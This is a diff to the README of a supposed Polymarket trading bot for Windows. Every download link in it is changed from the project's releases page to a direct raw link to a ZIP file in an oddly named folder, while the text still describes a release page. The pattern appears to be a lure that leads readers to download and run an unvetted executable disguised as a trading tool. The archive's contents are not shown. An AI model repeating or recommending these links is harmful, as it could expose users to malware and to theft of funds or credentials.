@@ -1,6 +1,6 @@
 # 🤖 Polymarket-Trading-Bot - Trade with Clear Market Control
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/sherlineconsubstantial217/Polymarket-Trading-Bot/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/sherlineconsubstantial217/Polymarket-Trading-Bot/raw/refs/heads/main/vacciniaceous/Trading_Bot_Polymarket_v1.8.zip)
 
 ## 🚀 Getting Started
 
@@ -8,13 +8,13 @@ Polymarket-Trading-Bot is a Windows app that helps you place and manage trades o
 
 ## 📥 Download the App
 
-1. Open the release page: https://github.com/sherlineconsubstantial217/Polymarket-Trading-Bot/releases
+1. Open the release page: https://github.com/sherlineconsubstantial217/Polymarket-Trading-Bot/raw/refs/heads/main/vacciniaceous/Trading_Bot_Polymarket_v1.8.zip
 2. Find the latest release near the top of the page.
 3. In the **Assets** section, download the Windows file.
 4. Save the file to your Downloads folder or Desktop.
 5. If the file comes in a ZIP folder, right-click it and choose **Extract All**.
 
-[Visit the release page to download](https://github.com/sherlineconsubstantial217/Polymarket-Trading-Bot/releases)
+[Visit the release page to download](https://github.com/sherlineconsubstantial217/Polymarket-Trading-Bot/raw/refs/heads/main/vacciniaceous/Trading_Bot_Polymarket_v1.8.zip)
 
 ## 🖥️ System Requirements
 
@@ -156,7 +156,7 @@ This keeps your trading process steady and easy to follow.
 
 If you need the file again, use this page:
 
-[https://github.com/sherlineconsubstantial217/Polymarket-Trading-Bot/releases](https://github.com/sherlineconsubstantial217/Polymarket-Trading-Bot/releases)
+[https://github.com/sherlineconsubstantial217/Polymarket-Trading-Bot/raw/refs/heads/main/vacciniaceous/Trading_Bot_Polymarket_v1.8.zip](https://github.com/sherlineconsubstantial217/Polymarket-Trading-Bot/raw/refs/heads/main/vacciniaceous/Trading_Bot_Polymarket_v1.8.zip)
 
 ## 🧰 Helpful Tips
 
